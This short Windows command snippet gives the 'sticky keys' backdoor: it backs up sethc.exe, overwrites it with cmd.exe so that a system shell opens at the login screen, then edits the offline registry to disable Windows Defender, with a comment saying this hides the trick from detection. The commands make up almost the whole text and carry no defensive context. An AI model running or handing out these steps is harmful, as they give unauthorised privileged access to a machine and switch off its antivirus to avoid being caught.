:: The first command backs up the sethc.exe file, and the second replaces it with the cmd.exe.

copy c:\windows\system32\sethc.exe c:\
copy /y c:\windows\system32\cmd.exe c:\windows\system32\sethc.exe

:: Run the following commands to disable Windows Defender as it may detect the sticky keys trick as a security alert called “Win32/AccessibilityEscalation“.

reg load HKLM\temp-hive c:\windows\system32\config\SOFTWARE
reg add "HKLM\temp-hive\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
reg unload HKLM\temp-hive